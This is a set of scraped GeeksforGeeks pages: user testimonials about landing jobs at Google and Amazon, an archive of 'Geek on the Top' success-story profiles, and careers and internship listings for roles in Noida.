the breadth of concepts and topics available on this site. Great work guys!! Thank you GeeksforGeeks for giving such an awesome platform to prepare for interviews. Read More Placed in Google, Amazon I am Siddharth Rajpal, a 2014 passout from NSIT and I used to visit your website to prepare for job interviews and once I was ready I started applying to various companies. I got recruited at Google, Amazon, Reliance Jio, Cadence, Mentor Graphics, Delhivery and Octro and all thanks to your website I am living a dream I once had. Siddharth Rajpal Placed in Google, Amazon I am Siddharth Rajpal, a 2014 passout from NSIT and I used to visit your website to prepare for job interviews and once I was ready I started applying to various companies. I got recruited at Google, Amazon, Reliance Jio, Cadence, Mentor Graphics, Delhivery and Octro and all thanks to your website I am living a dream I once had. Read More Amazon(2014) Google(2015) I just want to say “Thank you for create GeeksForGeeks”. My life change when I was accepted first in Amazon (2014) and then in Google( 2015), and it was possible studying everything from the page, thanks a lot, best regards:) Kyoo San Martin Monroy Amazon(2014) Google(2015) I just want to say “Thank you for create GeeksForGeeks”. My life change when I was accepted first in Amazon (2014) and then in Google( 2015), and it was possible studying everything from the page, thanks a lot, best regards:) Read More Thank you GeeksforGeeks for giving such an awesome platform to prepare for interviews. Vipin Khullar Thank you GeeksforGeeks for giving such an awesome platform to prepare for interviews. Read More Placed in Amazon Thank you for providing great platform for learning. Recently amazon visited our campus and I was interviewed by Amazon and got the offer just because of geeksforgeeks. Thanks a lot. Vivek Kumar Thakur Placed in Amazon Thank you for providing great platform for learning. Recently amazon visited our campus and I was interviewed by Amazon and got the offer just because of geeksforgeeks. Thanks a lot. Read More Thank you so much for providing one of the best portal to learn problem solving techniques, programming languages, Puzzles and many more. Murlidar Setty Thank you so much for providing one of the best portal to learn problem solving techniques, programming languages, Puzzles and many more. Read More Placed in Amazon as SDE-1 I recently got placed in Amazon. Thank you GeeksForGeeks for being an immense help.Thank you so much. Just to specify, it was an On Campus recruitment for SDE-1. Milind Shah Placed in Amazon as SDE-1 I recently got placed in Amazon. Thank you GeeksForGeeks for being an immense help.Thank you so much. Just to specify, it was an On Campus recruitment for SDE-1. Read More Thank you geeksforgeeks. It is a wonderful site to prepare.Thank you once again GeeksforGeeks for providing the awesome platform for preparation. Vaishali Pari Thank you geeksforgeeks. It is a wonderful site to prepare.Thank you once again GeeksforGeeks for providing the awesome platform for preparation. Read More Goldman Sachs During my stay at GeeksforGeeks I got to learn a lot. I was directly in touch with all the employees of the company and seeing my work making a direct impact was indeed satisfying. They were really compassionate and eager to listen to my ideas and implement them in the real world. As all the interns and employees over there were working in close proximity to each other, it was a tremendous learning curve for me. The best part about this organisation is that the working condition encourages you to work more and I never felt like being burdened. There is a feedback process followed which enables timely assessment and guidance to work in the right direction. All and all, I can say that it was a great experience working with like-minded individuals during my internship at GeeksforGeeks. Abhiraj Smit Goldman Sachs During my stay at GeeksforGeeks I got to learn a lot. I was directly in touch with all the employees of the company and seeing my work making a direct impact was indeed satisfying. They were really compassionate and eager to listen to my ideas and implement them in the real world. As all the interns and employees over there were working in close proximity to each other, it was a tremendous learning curve for me. The best part about this organisation is that the working condition encourages you to work more and I never felt like being burdened. There is a feedback process followed which enables timely assessment and guidance to work in the right direction. All and all, I can say that it was a great experience working with like-minded individuals during my internship at GeeksforGeeks. Read More Was selected in GS and Ca First of all, I want to thank you for the immense help that you guys were in my placement preparation. I was selected for GS and Cap One in campus placements at IIT Kanpur and a large part of that is because of invaluable resources hosted at your website. I can’t describe to you in words, how grateful I am for all the resources provided on your website (including that sorted matrix problem). Kanhaya Namdhar Was selected in GS and Cap One through campus placement at IIT Kanpur First of all, I want to thank you for the immense help that you guys were in my placement preparation. I was selected for GS and Cap One in campus placements at IIT Kanpur and a large part of that is because of invaluable resources hosted at your website. I can’t describe to you in words, how grateful I am for all the resources provided on your website (including that sorted matrix problem). Read More Preparing for Google inte Hey guys! Thanks a million for your videos, explanations and code on your website, I’m currently preparing for a round of interviews at Google, and all your content has been incredibly helpful, thanks a lot, keep up the amazing work. Jean Gagnair Preparing for Google interview Hey guys! Thanks a million for your videos, explanations and code on your website, I’m currently preparing for a round of interviews at Google, and all your content has been incredibly helpful, thanks a lot, keep up the amazing work. Read More Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? × room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Geek on the Top Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Rachit Belwariar - Geek on the top | The best part at writing GeeksforGeeks were the questions asked by other users on my articlesAashish Barnwal - Geek on the top | Make a habit of writing clean, readable, flexible and robust codeGaurav Sen - Geek on the top | Patience is the key factor for a good learnerHarshil Shah - Geek on the Top | Solving lots of easy problems are not as beneficial as practicing some hard problemsSumeet Varma - Geek on the Top | Actual fun begins when you solely concentrate on finding algo to solve a problemRachit Jain - Geek on the top | "Stop starting, start finishing: Don't just give up on things and then start doing something else"Nitish Kumar - Geek on the top | "An opportunity may come from anywhere, so always be prepared"Sahil Garg - Geek on the top | "First Solve the Problem, then Write the code"Abhishek Verma - Geek on the top | "Think Big to Achieve Big"Nikhil Kumar - Geek on the top | "Never follow the crowd, be the face of it"Akshay Miterani - Geek on the top | "You miss 100% of the shots you don’t take. So shoot more!"Jeel Vaishnav - Geek on the Top | “Our greatest glory is not in never failing, but in rising every time we fail”.Anmol Mishra - Geek on the top | “There is no excuse for success”Siddhant Gupta - Geek on the top | "Opportunities don't happen. You create them."Shashank Pathak - Geek on the top | Don’t let your mind get diverted to the consequences of not solving a problemVicky Tiwari - Geek on the top | Don't forget to read editorials and upsolve problems after each contestAyush Jaggi - Geek on the top | Get frustrated by TLEs and WAs, Higher the frustration - better the codeVaibhav Gosain - Geek on the Top | It is important to solve problems which are a bit above your current levelAditya Gupta - Geek on the Top | Participating alone increases your level, no matter you win or notNafis Sadique - Geek on the Top | Seniors should take the responsibility to introduce the junior students to the world of programmingPratul Kumar - Geek on the top | Learning is not a race, so it should not be treated like sameRodrigo San Martin Monroy - Geek on the Top | Extract common topics from previously asked interviews of the company you want to join Category Archives: Geek on the Top Nitish Kumar – Geek on the top | “An opportunity may come from anywhere, so always be prepared” Last Updated: 17-09-2019 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Jeel Vaishnav – Geek on the Top | “Our greatest glory is not in never failing, but in rising every time we fail”. Last Updated: 01-07-2019 3.6 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Nikhil Kumar – Geek on the top | “Never follow the crowd, be the face of it” Last Updated: 22-05-2019 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the TopMisc Akshay Miterani – Geek on the top | “You miss 100% of the shots you don’t take. So shoot more!” Last Updated: 15-05-2019 3.6 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are an inspiration for other… Read More » Geek on the Top Abhishek Verma – Geek on the top | “Think Big to Achieve Big” Last Updated: 04-12-2018 3 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Siddhant Gupta – Geek on the top | “Opportunities don’t happen. You create them.” Last Updated: 29-11-2018 3.6 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are inspiration for other geeks.… Read More » Geek on the Top Anmol Mishra – Geek on the top | “There is no excuse for success” Last Updated: 15-11-2018 5 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are an inspiration for other… Read More » Geek on the TopGSoC Gaurav Sen – Geek on the top | Patience is the key factor for a good learner Last Updated: 22-10-2018 4.8 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are an inspiration for other… Read More » Geek on the Top Rachit Jain – Geek on the top | “Stop starting, start finishing: Don’t just give up on things and then start doing something else” Last Updated: 22-10-2018 4.5 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Sahil Garg – Geek on the top | “First Solve the Problem, then Write the code” Last Updated: 22-10-2018 4 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Pratul Kumar – Geek on the top | Learning is not a race, so it should not be treated like same Last Updated: 22-10-2018 4.5 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Shashank Pathak – Geek on the top | Don’t let your mind get diverted to the consequences of not solving a problem Last Updated: 22-10-2018 3.6 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are the inspiration for other… Read More » Geek on the Top Rachit Belwariar – Geek on the top | The best part at writing GeeksforGeeks were the questions asked by other users on my articles Last Updated: 08-10-2020 4.2 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are an inspiration for other… Read More » Geek on the Top Aditya Gupta – Geek on the Top | Participating alone increases your level, no matter you win or not Last Updated: 22-10-2018 4.1 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are inspiration for other geeks.… Read More » Geek on the Top Vicky Tiwari – Geek on the top | Don’t forget to read editorials and upsolve problems after each contest Last Updated: 22-10-2018 5 Geek on the top is all about success stories of Geeks who are working hard to chase their goals and are inspiration for other geeks.… Read More » Geek on the Top Page 1 of 212» Most popular articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most visited articles Difference between List VS Set VS Tuple in PythonTop 5 IDEs for C++ That You Should Try OnceHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Careers - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Careers What impact will you make? Are you ready to apply your knowledge to exciting new challenges? From learning to leadership, this is your chance to take your career to a next level. Apply for below listed vacancies and our team will get in touch with you. Full Time Jobs 1) Profile: Associate Mentor/ Mentor Job Description : GeeksforGeeks stands apart from other platforms because only experienced professionals are permitted to lead our cohorts. We are seeking individuals who possess software development/ teaching experience. The Mentor will be responsible to take online classes/live classes and will be responsible for the creation of course material. Required Educational Background : M.tech tier-1 or 2 colleges will be preferred. B.tech/M.tech from other institutes with good competitive programming handles can also apply Required Experience : 1-5 yrs (experience with Tech Institutes/ Training Institutes/ IT Services Organizations) Freshers can apply? Yes, if you are good at competitive programming and have a good rating on coding platforms. For example, A rating of 5 stars or more on Codechef. You should apply if: You are comfortable and confident guiding students through structured lesson plans while sometimes needing to diverge from the lecture track to give real-world examples based on your own experiences. You are honest and open with your students and display a genuine desire to help them learn and grow. You are able to keep your highest-performing students engaged with additional challenges. You are capable of translating your own career experiences into advice for aspiring developers. What we expect from our Course Mentors: Candidates with Excellent in-depth knowledge of Data Structures and Algorithms along with at least one technology stack Candidates with experience on live projects and excellent programming skills will be preferred. You should possess excellent communication skills and should be able to communicate effectively with diversified student base (Including International Geographic locations). You are willing to research and explore best practices in teaching and are able to contribute to the ongoing evolution of a comprehensive curriculum, with supporting exercises to produce valuable junior developers. Salary offered: ● 7-9 LPA for Associate Mentors (Freshers from tier 1 and tier 2 colleges) ● 10 LPA and above for experienced professionals Expected Date of Joining : As soon as possible Location : Noida Click here to apply 2) Profile: Software Developer Job Description : We are looking for a coding fanatic who is interested in working upon and learning new technologies. A person who will closely work with our Software team to accomplish the operational excellence of the GeeksforGeeks website. If you think you have the niche for new technologies to work on, you will be our choice to go. Roles and Responsibilities : You will be responsible for adding and improving functionalities to the various domains of GeeksforGeeks. You will be responsible for developing REST APIs for backend services like Authentication, Authorization, etc. Desired Skills: Good knowledge and working experience in React JS and Javascript. Excellent Knowledge of Data Structures and Algorithms/ Programming Concepts. Experience in basic Web development (HTML5/ CSS3/ JavaScript/ SQL). Well versed with RDBMS with hands on experience in MySQL. Knowledge of Amazon AWS and cloud services. Experience in Backend development (Django/ Core PHP). Familiarity with RESTful APIs to connect Web applications to back-end service. Strong knowledge of Object Oriented programming, design principles, patterns, and best practices. Creativity and critical thinking to optimally implement new features. Familiarity with code versioning tools like Git. Learn quickly and adapt to a fast-changing environment. Ability and eagerness to learn and explore new topics independently. Qualification : B Tech./ M Tech.(CS/IT) OR MCA Salary offered: Best in industry. Expected Date of Joining : As soon as possible Location : Noida Click here to apply 3) Profile : Member of Technical Staff (DSA) Job Description : We are looking for a Computer Science enthusiast who is willing to contribute to the technical content development of our website. The position entails working with our review team in the assessment and development of the content present on our website. If you think you have command over DSA on your fingertips along with good analytical skills, then your profile would be the catch for us. Roles and Responsibilities : You will coordinate and work with the Technical Content Team for creating and reviewing quality content for our website and stimulate problems for various domains. Review technical content, articles, codes, and other contents to be published on our website. Create problems and test the questions across various difficulty levels for Hiring Contests,conducted by GeeksforGeeks. Desired Skills: Excellent Knowledge of Data Structures and Algorithms Knowledge of other computer science subjects (Would be a plus) Qualification : B Tech./ M Tech. (CS/IT) OR MCA Salary offered: Best in industry. Expected Date of Joining : As soon as possible Location : Noida Click here to apply 4) Profile : Member of Technical Staff (JAVA) Job Description : We are looking for a Computer Science enthusiast who is willing to contribute to the technical content development of our website. The position entails working with our review team in the assessment and development of the content present on our website. If you think you have command over Java on your fingertips along with good analytical skills, then your profile would be the catch for us. Roles and Responsibilities : You will coordinate and work with the Technical Content Team for creating and reviewing quality content for our website and stimulate problems for various domains. Review technical content, articles, codes, and other contents to be published on our website. Create problems and test the questions across various difficulty levels for Hiring Contests, conducted by GeeksforGeeks. Desired Skills: Excellent Knowledge of Java Knowledge of other computer science subjects, Java Advanced would be a plus Qualification : B Tech./ M Tech. (CS/IT) OR MCA Salary offered: Best in industry. Expected Date of Joining : As soon as possible Location : Noida Click here to apply 5) Profile : Course Counsellor (Sales) Job Description : GeeksforGeeks is currently looking for ambitious and highly-skilled sales and marketing personnel. You will have tremendous opportunities to develop and form innovative campaigns that will help to grow our organization’s marketing strategies.Candidates for this role should be creative, charismatic, knowledgeable, and exceptionally well-versed in Social Media Marketing. If you think you can help channelise GeeksforGeeks various Marketing strategies , then you are what we are looking for. Roles and Responsibilities : Work collaboratively with the sales team to assess current projections. Will be responsible for all the communication with clients and getting them on board for association. Resolving queries of candidates for our courses and converting them to sales. Help to detail, design, and implement marketing plans for each product and services being offered. Handling social media channels of GeeksforGeeks. Desired Skills: Excellent Verbal and Written English and excellent in Communication Skills. Experience in selling Computer Science or Coding Courses Proficient in Social Media Marketing, Email Marketing Qualification : Any Graduate/Post-Graduate (B.Tech in CS Preferred) Salary offered: Best in industry. Expected Date of Joining : As soon as possible Location : Noida Click here to apply 6) Profile: Business Development Executive Job Description : You need to assist with the daily functions of the Marketing Team including content development, campus outreach, basic market research for lead generation & its conversion. Collaborate with the campus authorities and campus managers to deliver projects for K12 learning. Develop operational plans and branding activities. Roles and Responsibilities : Building a market position by locating, developing, defining, negotiating, and closing business relationships in campuses/ schools/ educational communities. Locating/proposing potential business deals for the company by contacting potential partners/clients. Onboarding new customers on the platform and familiarise them with our learning outcomes. Responsible for solving business and customer issues through strong lines of communication and presence of mind. Constantly working on brand promotion and marketing using innovative cost-effective methods. Desired Skills: Keen interest in education and innovation. An inherent ability to position, market, and sell an idea or product will be a key skillset. Proven success in institute sales and Positive attitude to dealing with institute people. Confident negotiator and public speaking skills. Strong communication skills in written, oral, email, telephone and presentation. Excellent organizational and time management skills. Capable of hands-on problem-solving, with ability to generate ideas and solutions. Capable of working independently, and in a team. Required Experience : 1-3 Years Experience (Institutional Relationship/ K12 learning) Qualification : B.tech (CS/IT)/ BBA / BCA / B.Sc. (CS) (other graduates with similar experience can be considered) Salary offered: Decent hike on last drawn/current CTC Expected Date of Joining : As soon as possible Location : Noida Click here to apply 7) Profile: Motion Graphic Designer Job Description : To process and enhance video assets based on standard procedures. The position requires the technical knowledge to identify improvement opportunities within the workflow and act upon reducing waste and improving quality of the product videos. Roles and Responsibilities : Familiarity with special effects and Compositing. Hands-on Experience on Graphics Design. Video editing and graphic designing on Adobe Premier or equally legible editing Software would be an advantage. Performs motion graphics for creating Product summary videos. Hands-on on Adobe After Effect. Ability to edit templates as per need on Adobe After Effects. Manage multiple projects and deliver work on time. Desired Skills: Ability to prioritize and multi-tasking. Knowledge about copyright in Digital Media. Very organized and detail-oriented. A positive ” can-do” attitude. Required Experience : 0-3 Years Experience Qualification : B.tech / Media & Mass comm/ BCA/ MCA Salary offered: 3-4 LPA Expected Date of Joining : As soon as possible Location : Noida Click here to apply 8) Profile: Graphic Designer Job Description : GeeksforGeeks is looking for a graphics designer who will have strong creative skills and a portfolio of work that demonstrates their passion for content development & illustrative design. Roles and Responsibilities : Responsible mainly for social media graphics, marketing collaterals, illustrations, and logo design Knowledge and understanding of typography, color theory, logo design, image selection layouts, grids, templates, image use and graphic design principles. Design creatives for digital marketing like social media posts & ad campaigns, blog posts images and infographics mostly around programming material. Hands-on Experience on Graphics Design. Graphic designing on Adobe Premier or equally legible editing Software would be an advantage. Manage multiple projects and deliver work on time. Desired Skills: Design software/tools knowledge is good to have but creativity and design sense is a must. Ability to prioritize and multi-tasking. Knowledge about copyright in Digital Media. Very organized and detail-oriented. A positive ” can-do” attitude. Required Experience : 0-3 Years Experience Qualification : B.tech / Media & Mass comm/ BCA/ MCA Salary offered: 3-4 LPA Expected Date of Joining : As soon as possible Location : Noida Click here to apply 9) Profile: Product Designer Job Description : GeeksforGeeks is looking for a Product designer who will have strong creative skills. As a Product Designer, you’ll tackle complex tasks and transform them into intuitive, accessible, and easy-to-use designs for millions of people around the world from first-time users to experts. Roles and Responsibilities : Designing new products, interfaces, and user experiences for multiple platforms. Simplifying complex user interactions, highlighting the product’s brand and unique personality. Collaboration with product teams throughout the design process – from creation to production – creating user flows, wireframes & building user-interface mockups. Reviewing and improving our current platform. Evaluate and set best UI practices and standards. Integrating and managing the brand through a visual design language. Experience designing and thinking in design systems translating complexity to simplicity. Deep understanding of responsive and adaptive design. Desired Skills: Design software/tools knowledge is good to have but creativity and design sense is a must. Ability to prioritize and multi-tasking. Self-starter who is a customer-obsessed, detail-oriented, and an enthusiastic team player. Knowledge of building user-experiences for mobile apps across mobile & web applications. A positive ” can-do” attitude. Required Experience : 0-3 Years Experience Qualification : B.tech / Media & Mass comm/ BCA/ MCA Salary offered: 3-4 LPA Expected Date of Joining : As soon as possible Location : Noida Click here to apply 10) Profile: Software Development Engineer Job Description : We are looking for a coding fanatic who is interested in working upon and learning new technologies. A person who will closely work with our Software team to accomplish the operational excellence of the GeeksforGeeks website. If you think you have the niche for new technologies to work on, you will be our choice to go. Roles and Responsibilities : You will be responsible for adding and improving functionalities to the various domains of GeeksforGeeks. You will be responsible for developing REST APIs for backend services like Authentication, Authorization, etc. Desired Skills: Good knowledge and working experience in React JS and Javascript. Excellent Knowledge of Data Structures and Algorithms/ Programming Concepts. Experience in basic Web development (HTML5/ CSS3/ JavaScript/ SQL). Well versed with RDBMS with hands-on experience in MySQL. Knowledge of Amazon AWS and cloud services. Experience in Backend development (Django/ Core PHP). Familiarity with RESTful APIs to connect Web applications to back-end service Strong knowledge of Object Oriented programming, design principles, patterns, and best practices. Creativity and critical thinking to optimally implement new features. Familiarity with code versioning tools like Git. Learn quickly and adapt to a fast-changing environment. Ability and eagerness to learn and explore new topics independently. Required Experience : 1-3 Years Experience Qualification : B Tech./ M Tech.(CS/IT) Salary offered: 7-10 LPA Expected Date of Joining : As soon as possible Location : Noida Click here to apply Part Time Jobs 1) Profile: Course Mentor Job Description : GeeksforGeeks stands apart from other platforms because only experienced professionals are permitted to lead our cohorts. We are seeking individuals who possess software development/ teaching experience. The Course Mentors should have strong command on Data Structures and Algorithms. Desired Skills: Candidates with Excellent in-depth knowledge of Data Structures and Algorithms. Candidates with experience on live projects and excellent programming skills will be preferred. You should posses excellent communication skills and should be able to communicate effectively with diversified student base (Including International Geographic locations). You are willing to research and explore best practices in teaching and are able to contribute to the ongoing evolution of a comprehensive curriculum, with supporting exercises to produce valuable junior developers. Basic Knowledge of Adobe After Effects and Adobe Photoshop. You should apply if: You are comfortable and confident guiding students through structured lesson plans while sometimes needing to diverge from the lecture track to give real world examples based on your own experiences. You are honest and open with your students and display a genuine desire to help them learn and grow. You are able to keep your highest performing students engaged with additional challenges. You are capable of translating your own career experiences into advice for aspiring developers. Required Experience: 1-5 yrs (experience with Tech Institutes/ Training Institutes/ IT Services Organizations) Salary offered: 10 LPA and above Expected Joining : As soon as possible Location : Sector- 136, Noida Click here to apply 2) Profile: Technical Content Writer Description : Excellent writing skills in technical content is must for content writing. Click here to choose and write from a wide range of topics. Stream : Computer Science Desired Skills: C/C++/Java/Python/Data Structures and Algorithm. Expected Date of Joining : As soon as possible Click here to apply 3) Profile: Teaching Assistant Job Description : Job involves taking doubt sessions and coordinating with mentors. Desired Skills: Excellent in-depth knowledge of Data Structures and Algorithms. Candidates with excellent competitive programming profiles will be preferred. Location: Sector- 136, Noida, Uttar Pradesh, India. Job Type: Part-time/ Freelancer. Job Timings: Weekends (3 hours/day). How to Apply: Send your resume/CV to careers@geeksforgeeks.org with subject: Application for Teaching Assistant in Geeks Classes. My Personal Notes arrow_drop_up Save room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Internship - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Following internship profiles are available currently: Technical Content Engineer ( work from office ): Description :Excellent writing skills in technical content is must for content writing. You will also be responsible for Reviewing the technical content thoroughly. Duration of Internship : 6 – 12 months Stream : Computer Science Desired Skills: C/C++/Java/Python/Data Structures and Algorithm. Expected Date of Joining : As soon as possible Click here to apply Why should you apply? Candidates qualified for internship will be eligible for Certificates by GeeksforGeeks Students will also get Stipend of the internship Improves your knowledge as you need to learn extensively before writing an article Flexible work timings as this is work@home Internship Duration of internship can be one month to one year. Read more – Benefits of becoming a Content Writer at GeeksforGeeks Guidelines For writing different language code for existing Programs in existing articles- Click here For making videos for existing articles- Click here For other career related queries, drop a mail at careers@geeksforgeeks.org Click here to know about full time job vacancies. My Personal Notes arrow_drop_up Save room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

